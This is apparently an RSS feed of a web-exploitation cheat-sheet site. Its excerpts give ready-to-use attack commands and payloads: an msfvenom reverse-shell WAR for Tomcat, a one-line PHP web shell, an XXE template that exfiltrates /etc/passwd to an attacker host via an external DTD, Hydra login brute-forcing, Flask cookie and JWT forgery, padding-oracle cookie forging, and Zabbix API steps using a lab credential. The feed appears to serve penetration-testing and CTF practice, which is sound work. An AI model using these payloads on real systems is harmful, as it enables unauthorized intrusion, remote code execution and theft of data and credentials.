<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web Exploitation on TLDRBins</title>
    <link>https://tldrbins.github.io/@web-exploitation/</link>
    <description>Recent content in Web Exploitation on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@web-exploitation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Apache</title>
      <link>https://tldrbins.github.io/apache/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apache/</guid>
      <description>Check Apache version apache&#xA;Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf </description>
    </item>
    <item>
      <title>Apache Tomcat</title>
      <link>https://tldrbins.github.io/apache_tomcat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/apache_tomcat/</guid>
      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.</description>
    </item>
    <item>
      <title>Connection from Public Internet</title>
      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 3000 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ... # Redirect http request to localhost:&amp;lt;LOCAL_PORT&amp;gt; ssh -R 80:localhost:&amp;lt;LOCAL_PORT&amp;gt; serveo.net $ ssh -R 80:localhost:3000 serveo.net Forwarding HTTP traffic from https://7ddf32e17a6ac5ce04a8ecbf782ca509.serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
    </item>
    <item>
      <title>Electron</title>
      <link>https://tldrbins.github.io/electron/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/electron/</guid>
      <description>Tools sudo npm -g install asar Unpack app.asar # List files asar l &amp;lt;FILE&amp;gt; # Extract all files asar e &amp;lt;FILE&amp;gt; # Extract a file asar ef &amp;lt;FILE&amp;gt; main.js </description>
    </item>
    <item>
      <title>Flask Cookie</title>
      <link>https://tldrbins.github.io/flask_cookie/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/flask_cookie/</guid>
      <description>Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
    </item>
    <item>
      <title>git</title>
      <link>https://tldrbins.github.io/git/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/git/</guid>
      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff &amp;lt;A_COMMIT_HASH&amp;gt; &amp;lt;B_COMMIT_HASH&amp;gt; # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; Git Tools git-dumper git-bundle git-dumper &amp;lt;TARGET&amp;gt; result/ Ref: git-dumper</description>
    </item>
    <item>
      <title>Hydra</title>
      <link>https://tldrbins.github.io/hydra/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/hydra/</guid>
      <description>HTTP basic auth hydra -L &amp;lt;USERS_FILE&amp;gt; -P &amp;lt;PASSWORD_FILE&amp;gt; -s &amp;lt;TARGET_PORT&amp;gt; -f &amp;lt;TARGET&amp;gt; http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra &amp;lt;TARGET&amp;gt; -l &amp;lt;USER&amp;gt; -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form &amp;#39;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#39; +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.</description>
    </item>
    <item>
      <title>Joomla</title>
      <link>https://tldrbins.github.io/joomla/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/joomla/</guid>
      <description>Check Version curl -s &amp;lt;TARGET&amp;gt;/administrator/manifests/files/joomla.xml | head Admin Panel curl -s &amp;lt;TARGET&amp;gt;/administrator </description>
    </item>
    <item>
      <title>JWT</title>
      <link>https://tldrbins.github.io/jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/jwt/</guid>
      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key # Invoking python interpreter python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_N&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt # For example, modify role to admin python3 jwt_tool.</description>
    </item>
    <item>
      <title>Nginx</title>
      <link>https://tldrbins.github.io/nginx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nginx/</guid>
      <description>Config location /etc/nginx/sites-enabled </description>
    </item>
    <item>
      <title>Openssl</title>
      <link>https://tldrbins.github.io/openssl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/openssl/</guid>
      <description>Basics Show TLS Certificate of a HTTPS Web Server echo | openssl s_client -showcerts -servername &amp;lt;TARGET&amp;gt; -connect &amp;lt;TARGET&amp;gt;:443 2&amp;gt;/dev/null | openssl x509 -inform pem -noout -text Decrypt a Password Protected Private Key openssl rsa -in &amp;lt;KEY_FILE&amp;gt; -out decrypted_&amp;lt;KEY_FILE&amp;gt; Create a Personal Information Exchange File (.pfx) openssl pkcs12 -export -out &amp;lt;PFX_FILE&amp;gt; -inkey &amp;lt;KEY_FILE&amp;gt; -in &amp;lt;CRT_FILE&amp;gt; View RSA Private Key (.key) openssl rsa -in &amp;lt;KEY_FILE&amp;gt; -noout -text View Certificate (.crt) openssl x509 -in &amp;lt;CRT_FILE&amp;gt; -noout -text View Personal Information Exchang (.</description>
    </item>
    <item>
      <title>Padding Oracle</title>
      <link>https://tldrbins.github.io/padding_oracle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/padding_oracle/</guid>
      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
    </item>
    <item>
      <title>PHP Command Shell</title>
      <link>https://tldrbins.github.io/php_cmd_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
    </item>
    <item>
      <title>Retrieve Flask Debug Pin</title>
      <link>https://tldrbins.github.io/retrieve_flask_debug_pin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/retrieve_flask_debug_pin/</guid>
      <description>Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) $ cat /proc/self/environ LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data ---[SNIP]--- $ cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) LOGNAME=www-data USER=www-data 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ Traceback (most recent call last) File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app response = self.handle_exception(e) ---[SNIP]--- 3. Get MAC address cat /sys/class/net/eth0/address $ cat /sys/class/net/eth0/address 00:50:56:b9:2e:50 # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.</description>
    </item>
    <item>
      <title>XXE (XML External Entity)</title>
      <link>https://tldrbins.github.io/xxe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/xxe/</guid>
      <description>XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://&amp;lt;LOCAL_IP&amp;gt;/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
    </item>
    <item>
      <title>Zabbix</title>
      <link>https://tldrbins.github.io/zabbix/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/zabbix/</guid>
      <description>Zabbix 7.0+ API Check Zabbix Version curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;apiinfo.version&amp;#34;,&amp;#34;params&amp;#34;:{},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . ┌──(kali㉿kali)-[~] └─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;apiinfo.version&amp;#34;,&amp;#34;params&amp;#34;:{},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . { &amp;#34;jsonrpc&amp;#34;: &amp;#34;2.0&amp;#34;, &amp;#34;result&amp;#34;: &amp;#34;7.0.0&amp;#34;, &amp;#34;id&amp;#34;: 1 } Authentication curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;,&amp;#34;params&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;&amp;lt;USER&amp;gt;&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34;},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . ┌──(kali㉿kali)-[~] └─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H &amp;#39;Content-Type: application/json-rpc&amp;#39; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;,&amp;#34;params&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;matthew&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;96qzn0h2e1k3&amp;#34;},&amp;#34;id&amp;#34;:1}&amp;#39; | jq . { &amp;#34;jsonrpc&amp;#34;: &amp;#34;2.0&amp;#34;, &amp;#34;result&amp;#34;: &amp;#34;d983875587424cdbc8d3182166e11580&amp;#34;, &amp;#34;id&amp;#34;: 1 } Get Users curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.</description>
    </item>
  </channel>
</rss>
